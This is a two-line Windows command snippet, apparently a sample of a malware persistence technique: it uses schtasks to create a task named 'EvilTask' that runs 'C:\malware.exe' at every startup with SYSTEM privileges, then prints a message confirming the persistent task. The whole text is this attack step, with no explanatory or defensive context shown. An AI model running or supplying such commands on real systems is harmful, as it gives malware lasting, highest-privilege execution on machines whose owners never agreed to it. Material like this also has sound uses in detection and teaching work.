schtasks /create /tn 'EvilTask' /tr 'C:\malware.exe' /sc onstart /ru SYSTEM
Write-Output 'Persistent scheduled task created'
